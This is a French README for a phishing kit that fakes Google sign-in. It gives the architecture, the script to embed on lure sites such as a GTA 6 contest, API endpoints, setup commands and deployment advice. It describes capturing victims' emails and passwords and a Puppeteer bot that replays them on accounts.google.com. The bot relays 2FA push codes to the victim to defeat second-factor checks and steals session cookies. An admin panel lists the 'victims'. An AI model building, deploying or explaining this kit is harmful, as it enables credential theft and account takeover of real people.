# GOOGLE AUTH KIT v2.0

Kit modulaire "plug & play" pour integrer un faux flux d authentification Google sur n importe quel site.

## Fonctionnement

```
[TON SITE (GTA, concours...)]
        |
        | click "Connexion Google"
        v
[Overlay google-auth.html]  --(iframe)-->  email + password
        |
        v
[API /api/auth/capture-*]  --(POST)-->  Supabase
        |
        v
[Bot Puppeteer]  --(Chrome)-->  accounts.google.com  +  notification telephone
        |
        v
[Relay temps reel]  --(GET /api/relay)-->  Affichage code 2FA sur l overlay
```

## Fichiers

| Fichier | Role |
|---------|------|
| `server.js` | Serveur Express (API + static) |
| `front/google-auth.html` | Faux Google Auth (4 ecrans) |
| `front/loader.js` | Script a coller sur ton site (ouvre l overlay) |
| `admin/index.html` | Panel admin (liste des victimes) |
| `worker/google-auth-agent.js` | Bot Puppeteer |
| `worker/relay-store.js` | Stockage temps reel code/telephone |
| `worker/proxy-rotator.js` | Rotation proxy (optionnel) |
| `worker/session-manager.js` | Gestion sessions Chrome |
| `api/supabase-client.js` | Client Supabase (optionnel si tu veux l importer) |
| `.env.example` | Variables d environnement |
| `package.json` | Dependances |

## Integration sur ton site (3 lignes)

Ajoute dans le `<head>` ou `<body>` de ton site GTA :

```html
<script src="http://localhost:8080/overlay/loader.js" data-api-base="http://localhost:8080"></script>
```

Puis un bouton :

```html
<button onclick="GoogleAuthKit.open('GTA 6 Concours', window.location.href)">
  Connexion Google
</button>
```

### Si deploie sur Render/Railway :

Remplace `http://localhost:8080` par ton URL deploiement, ex :
```html
<script src="https://cademo.onrender.com/overlay/loader.js"
        data-api-base="https://cademo.onrender.com"></script>
```

## Demarrage

```bash
npm install
# Cree le .env avec tes cles Supabase
cp .env.example .env
# Edite .env avec tes vraies cles
node server.js
```

Le serveur demarre sur `http://localhost:8080`.

## Architecture du faux flux (4 ecrans)

1. **Email** - Capture l email, l envoie a Supabase, cree un userId
2. **Password** - Capture le MDP, l envoie a Supabase
3. **CAPTCHA** - Spinner "Chargement en cours..." (le bot est lance en background)
4. **Validation** - Affiche le code 2FA extrait par le bot en temps reel + bouton "J ai valide"

## API Endpoints

| Endpoint | Methode | Description |
|----------|---------|-------------|
| `POST /api/auth/capture-email` | email, siteName, siteUrl | Cree la victime |
| `POST /api/auth/capture-password` | userId, password | Enregistre le MDP |
| `POST /api/auth/launch-bot/:userId` | - | Lance le bot Puppeteer |
| `POST /api/validate-account/:userId` | - | Alias compatible cademo |
| `POST /api/relay` | email, code, phone, status | Stocke code (appelle par le bot) |
| `GET /api/relay/:email` | - | Recupere le code (polling front) |
| `GET /api/stats` | - | Statistiques |
| `GET /api/victims?password=XXX` | - | Liste des victimes (admin) |

## Bot Puppeteer (google-auth-agent.js)

Le bot fait ceci :

1. Ouvre Chrome (headless ou visible)
2. Va sur `accounts.google.com`
3. Remplit email + mot de passe
4. Si mot de passe faux :
   - Clique "Mot de passe oublie"
   - Selectionne "Notification sur telephone"
   - Attend que la victime approuve
   - Extrait le code du challenge device si present
   - Envoie le code au relay
5. Recupere les cookies de session
6. Stocke dans Supabase (status = session_active)

## Notes

- Le bot NE FONCTIONNE PAS sur Render Free (pas de Chrome, 512 Mo RAM)
- Fonctionne sur : Railway.app, VPS Hetzner/Contabo, ton PC local
- Le loader.js utilise `window.postMessage` pour communiquer avec le parent
- Le parent peut recuperer l evenement `message` avec `e.data.gak === 'redirect'`
